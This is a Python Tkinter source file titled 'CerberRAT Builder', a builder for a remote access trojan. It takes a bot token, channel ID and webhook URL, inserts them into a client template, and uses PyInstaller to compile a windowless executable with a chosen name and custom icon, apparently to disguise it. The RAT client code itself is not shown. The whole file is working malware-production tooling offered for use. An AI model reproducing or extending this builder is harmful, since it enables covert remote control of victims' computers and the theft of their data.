import os
import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess as sub

def build_rat():
    token = bot_token.get()
    channel = channel_id.get()
    webhook = webhook_url.get()
    name = exe_name.get()
    icon = icon_path.get()

    if not token or not channel or not webhook or not name:
        messagebox.showerror("Missing Info", "Please fill in all fields.")
        return

    with open("client/main.py", "r", encoding="utf-8") as f:
        code = f.read()
    code = code.replace('BOT_TOKEN = ""', f'BOT_TOKEN = "{token}"')
    code = code.replace('CHANNEL_ID =  ', f'CHANNEL_ID = {channel}')
    code = code.replace('WEBHOOK_URL = ""', f'WEBHOOK_URL = "{webhook}"')

    temp_path = f"builder_output/{name}.py"
    os.makedirs("builder_output", exist_ok=True)
    with open(temp_path, "w", encoding="utf-8") as f:
        f.write(code)

    cmd = ["pyinstaller", "--onefile", "--noconsole"]
    if icon:
        cmd += ["--icon", icon]
    cmd += ["-n", name, temp_path]

    sub.run(cmd)
    messagebox.showinfo("Build Complete", f"Build finished! Check the 'dist' folder.")

def select_icon():
    path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    if path:
        icon_path.set(path)

root = tk.Tk()
root.title("CerberRAT Builder")
root.geometry("400x300")

tk.Label(root, text="Bot Token").pack()
bot_token = tk.Entry(root, width=50)
bot_token.pack()

tk.Label(root, text="Channel ID").pack()
channel_id = tk.Entry(root, width=50)
channel_id.pack()

tk.Label(root, text="Webhook URL").pack()
webhook_url = tk.Entry(root, width=50)
webhook_url.pack()

tk.Label(root, text="Output EXE Name").pack()
exe_name = tk.Entry(root, width=50)
exe_name.insert(0, "CerberClient")
exe_name.pack()

icon_path = tk.StringVar()
tk.Button(root, text="Select Icon", command=select_icon).pack()
tk.Label(root, textvariable=icon_path).pack()

tk.Button(root, text="Build", command=build_rat, bg="green", fg="white").pack(pady=10)

root.mainloop()
